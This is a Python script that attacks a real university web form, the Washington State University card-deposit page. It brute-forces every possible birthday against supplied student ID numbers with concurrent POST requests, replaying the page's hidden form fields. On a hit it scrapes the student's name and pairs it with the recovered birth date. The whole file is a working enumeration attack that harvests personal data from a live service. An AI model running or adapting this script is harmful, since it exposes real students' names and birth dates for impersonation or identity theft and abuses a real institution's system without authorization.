import asyncio

import copy
import sys

import aiohttp
from bs4 import BeautifulSoup

from birthdays import BIRTHDAYS

ENDPOINT = "https://livingat.wsu.edu/cardinfo/deposit/default.aspx?mode=CC"
RESULT = None


class Student:
    def __init__(self, wsu_id, name, birthday):
        self.wsu_id = wsu_id
        self.name = name
        self.birthday = birthday

    def __str__(self):
        return f"{self.wsu_id} -> {self.name} - Born {self.birthday}"


async def get_params():
    async with aiohttp.ClientSession() as session:
        async with session.get(ENDPOINT) as response:
            text = await response.text()

    bs = BeautifulSoup(text, 'html.parser')

    # Get hidden inputs to recreate request
    # No CSRF token because?
    view_state = bs.find(id="__VIEWSTATE").get('value')
    prev_page = bs.find(id="__PREVIOUSPAGE").get('value')  # TODO: Remove?
    event_val = bs.find(id="__EVENTVALIDATION").get('value')

    # Hidden fields
    params = {
        "__EVENTTARGET": "ctl00$mainContent$btnContinue",
        "__VIEWSTATE": view_state,
        "__PREVIOUSPAGE": prev_page,
        "__EVENTVALIDATION": event_val,
    }

    return params


async def check_birthday(params, birthday):
    params.update({
        "ctl00$mainContent$DropDownListMonth": birthday.month,
        "ctl00$mainContent$DropDownListDay": birthday.day,
    })

    async with aiohttp.ClientSession() as session:
        async with session.post(ENDPOINT, data=params) as response:
            text = await response.text()

    if "Birthday is incorrect" in text:
        return
    else:
        print(birthday)
        # We hit the jackpot
        bs = BeautifulSoup(text, 'html.parser')
        name = bs.find(id="ctl00_mainContent_lblName").text.lstrip(" - ")

        global RESULT
        RESULT = name, birthday
        return


def lookup_wsu_id(wsu_id):
    loop = asyncio.get_event_loop()

    params = loop.run_until_complete(get_params())

    params["ctl00$mainContent$txtWSUID"] = wsu_id

    loop.run_until_complete(
        asyncio.gather(
            *(check_birthday(copy.copy(params), birthday) for birthday in BIRTHDAYS)
        )
    )

    try:
        name, birthday = RESULT
    except TypeError:
        raise ValueError(f"{wsu_id} has no birthday! It probably doesn't exist")

    return Student(wsu_id, name, birthday)


def main():
    for wsu_id in sys.argv[1:]:
        print(wsu_id)
        student = lookup_wsu_id(wsu_id)
        print(student)


if __name__ == '__main__':
    main()
